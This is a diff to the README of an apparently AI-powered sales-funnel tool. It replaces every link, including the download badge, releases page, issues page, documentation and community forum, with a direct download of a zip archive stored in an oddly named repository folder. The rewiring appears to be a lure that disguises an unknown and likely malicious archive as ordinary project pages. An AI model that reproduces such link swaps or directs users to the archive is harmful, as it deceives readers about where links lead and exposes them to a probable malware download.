@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-gtm - Unlock Your AI-Powered Sales Funnel
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mahmut433/awesome-ai-gtm/releases)
+[![Download Release](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip%20Now-brightgreen)](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip)
 
 ## 📖 Overview
 
@@ -32,7 +32,7 @@ To begin using awesome-ai-gtm, you need to download the software from our Releas
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/mahmut433/awesome-ai-gtm/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip).
    
 2. Choose the version suited for your system. We offer different versions to ensure compatibility with various operating systems.
 
@@ -71,15 +71,15 @@ Once you have installed the software, open it to gain access to all features.
 
 ## 💬 Support
 
-For any issues or questions, please visit our [issues page](https://github.com/mahmut433/awesome-ai-gtm/issues). We address concerns promptly and appreciate your feedback.
+For any issues or questions, please visit our [issues page](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip). We address concerns promptly and appreciate your feedback.
 
 ## 🔗 Related Links
 
-- [Documentation](https://github.com/mahmut433/awesome-ai-gtm/wiki): Comprehensive guides and FAQs.
-- [Community Forum](https://github.com/mahmut433/awesome-ai-gtm/discussions): Connect with other users, share tips, and learn together.
+- [Documentation](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip): Comprehensive guides and FAQs.
+- [Community Forum](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip): Connect with other users, share tips, and learn together.
 
 ## 📈 Conclusion
 
 awesome-ai-gtm simplifies the process of using AI in your marketing strategy. Follow the installation steps above, and start building your GTM funnel today.
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mahmut433/awesome-ai-gtm/releases)
+[![Download Release](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip%20Now-brightgreen)](https://raw.githubusercontent.com/mahmut433/awesome-ai-gtm/main/temporaneously/awesome-ai-gtm.zip)
